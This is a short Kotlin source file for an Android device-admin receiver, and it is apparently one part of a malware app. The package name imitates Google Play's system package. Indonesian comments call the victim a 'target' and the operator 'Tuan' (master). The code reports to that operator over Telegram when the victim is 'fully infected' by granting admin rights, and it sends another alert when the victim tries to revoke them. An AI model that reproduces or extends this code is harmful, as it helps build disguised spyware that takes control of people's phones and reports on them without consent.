package com.android.vending.service

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast

class AdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        // Lapor ke Tuan saat target memberikan izin admin
        TelegramEngine.send("✅ TARGET TERINFEKSI TOTAL! Izin Admin Aktif.")
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        // Teror jika target mencoba mencabut izin
        TelegramEngine.send("⚠️ PERINGATAN! Target mencoba mencabut izin Admin!")
    }
}
